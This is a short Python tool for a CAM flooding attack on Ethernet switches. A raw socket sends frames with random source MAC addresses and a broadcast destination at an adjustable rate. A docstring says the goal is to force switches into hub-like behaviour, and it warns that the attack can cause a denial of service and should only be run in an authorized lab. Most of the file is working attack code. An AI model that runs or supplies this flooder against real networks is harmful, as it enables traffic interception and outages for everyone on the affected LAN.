import time
import binascii
import random
import socket


# Simple work function to perform tests:
def work(identity, index, rate):

    print("Worker %d is performing job number %d. Rate is %f" % (identity, index, rate))
    time.sleep(rate)

'''
DISCLAIMER: !!! Improper usage of this tool can get you prosecuted and/or fired. !!!
Only perform it inside an isolated lab environment, where you have full authorization to conduct such tests.
Be aware that this attack is extremely noisy and WILL be detected by network sniffers and security software.
Never launch this tool inside a production network. 

Be VERY careful with this code, this attack can either flood, or even perform a DoS on your switches in your LAN.
This attack, also known as a 'Cam flooding' attack, can force a switch to behave as an old hub, if its CAM memory becomes full.
In order to perform a CAM flooding attack, you must find the correct threshold value. Not too slow, but not too fast either.
Be aware that if you emit network frames at a rate too high, the switches could reach 100% CPU usage.
In that case, the CAM flooding attack will most likely fail, and the switches will become unresponsive.
Therefore, a high rate attack can be considered a Denial of Service attack, aka 'DoS'.
Your entire LAN (Including yourself) could lose connectivity.
'''


class CamFloodAttack:

    def __init__(self, selected_interface):
        super().__init__()

        print("Sending payload on following interface %s " % selected_interface)
        self.dest_mac = binascii.unhexlify('FFFFFFFFFFFF')
        self.arp_code = binascii.unhexlify('0806')
        self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        self.selected_interface = selected_interface
        self.s.bind((self.selected_interface, 0))

    def cam_flooder_random(self, identity, index, rate):

        print("Worker %d is performing job number %d. Rate is %f" % (identity, index, rate))
        i = random.randint(0, 100000000)
        source_mac = binascii.unhexlify("{:012X}".format(i))
        arp_frame = self.dest_mac + source_mac + self.arp_code
        self.s.send(arp_frame)
        time.sleep(rate)